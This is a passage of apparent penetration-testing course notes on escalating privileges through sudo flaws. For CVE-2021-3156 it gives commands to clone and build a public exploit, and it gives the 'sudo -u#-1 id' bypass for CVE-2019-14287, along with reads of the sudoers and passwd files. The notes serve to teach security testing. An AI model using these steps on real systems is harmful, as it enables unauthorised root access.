```shell
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

```shell
sudo -V | head -n1
```

```shell
git clone https://github.com/blasty/CVE-2021-3156.git
```

```shell
cd CVE-2021-3156
```

```shell
make
```

```shell
cat /etc/lsb-release
```

---
## Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shell
sudo -l
```

In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

```shell
cat /etc/passwd | grep cry0l1t3
```

```shell
sudo -u#-1 id
```



